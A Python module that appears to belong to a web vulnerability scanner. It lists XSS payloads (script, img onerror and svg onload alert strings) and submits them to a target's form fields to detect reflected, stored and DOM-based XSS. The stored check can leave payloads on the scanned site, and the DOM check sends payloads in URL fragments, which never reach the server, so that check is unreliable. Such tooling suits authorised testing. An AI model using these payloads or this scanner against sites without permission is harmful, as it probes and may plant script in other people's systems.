import requests
from urllib.parse import urljoin
from app.form_parser import get_forms
from functools import lru_cache

XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><script>alert("xss")</script>',
    "'><script>alert('xss')</script>",
    '<img src=x onerror=alert("xss")>',
    '"><img src=x onerror=alert("xss")>',
    '<svg onload=alert("xss")>',
    'javascript:alert("xss")',
    '"><svg onload=alert("xss")>',
]

DOM_PAYLOADS = [
    '#<script>alert("xss")</script>',
    '#"><img src=x onerror=alert("xss")>',
    '#<svg onload=alert("xss")>',
]

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml",
})


@lru_cache(maxsize=200)
def get_forms_cached(url):
    return get_forms(url)


def _resolve_action(base_url, action):
    if not action or action.strip() in ("#", ""):
        return base_url
    return urljoin(base_url, action)


def _send(method, url, data, timeout=10):
    try:
        if method == "post":
            return session.post(url, data=data, timeout=timeout, allow_redirects=True)
        else:
            return session.get(url, params=data, timeout=timeout, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request failed ({url}): {e}")
        return None


def _build_data(inputs, target_name=None, payload=None):
    data = {}
    for i in inputs:
        name = i.get("name")
        if not name:
            continue
        if name == target_name and payload is not None:
            data[name] = payload
        else:
            data[name] = i.get("value") or "test"
    return data


def _check_reflected(response_text, payload):
    return payload.lower() in response_text.lower()


def scan_xss(url):
    print(f"\n[XSS] Scanning: {url}")

    vulnerabilities = []
    found = set()

    try:
        forms = get_forms_cached(url)
    except Exception as e:
        print(f"  [!] Could not get forms: {e}")
        return vulnerabilities

    print(f"  [XSS] Forms found: {len(forms) if forms else 0}")

    if not forms:
        return vulnerabilities

    for form_idx, form in enumerate(forms):
        raw_action = form.get("action") or ""
        action = _resolve_action(url, raw_action)
        method = (form.get("method") or "get").lower().strip()
        inputs = form.get("inputs", [])
        named_inputs = [i for i in inputs if i.get("name")]

        print(f"  [XSS] Form {form_idx+1} inputs: {[i['name'] for i in named_inputs]}")

        if not named_inputs:
            continue

        for target in named_inputs:
            param = target["name"]

            # ── 1. Reflected XSS ────────────────────────────
            key = (action, param, "reflected")
            if key not in found:
                for payload in XSS_PAYLOADS:
                    data = _build_data(inputs, param, payload)
                    r = _send(method, action, data)
                    if r is None:
                        continue

                    if _check_reflected(r.text, payload):
                        print(f"  [VULN] Reflected XSS → param='{param}' payload='{payload}'")
                        vulnerabilities.append({
                            "type": "reflected",
                            "url": action,
                            "parameter": param,
                            "payload": payload,
                        })
                        found.add(key)
                        break

            # ── 2. Stored XSS ───────────────────────────────
            key = (action, param, "stored")
            if key not in found:
                for payload in XSS_PAYLOADS:
                    data = _build_data(inputs, param, payload)
                    _send(method, action, data)

                    r_check = _send("get", url, {})
                    if r_check is None:
                        continue

                    if _check_reflected(r_check.text, payload):
                        print(f"  [VULN] Stored XSS → param='{param}' payload='{payload}'")
                        vulnerabilities.append({
                            "type": "stored",
                            "url": action,
                            "parameter": param,
                            "payload": payload,
                        })
                        found.add(key)
                        break

        # ── 3. DOM-based XSS ─────────────────────────────
        key = (url, "dom")
        if key not in found:
            for payload in DOM_PAYLOADS:
                test_url = url + payload
                r = _send("get", test_url, {})
                if r is None:
                    continue

                if _check_reflected(r.text, payload.lstrip("#")):
                    print(f"  [VULN] DOM-based XSS → url='{test_url}'")
                    vulnerabilities.append({
                        "type": "dom-based",
                        "url": test_url,
                        "parameter": "URL fragment",
                        "payload": payload,
                    })
                    found.add(key)
                    break

    print(f"  [XSS] Found {len(vulnerabilities)} vulnerability(ies).")
    return vulnerabilities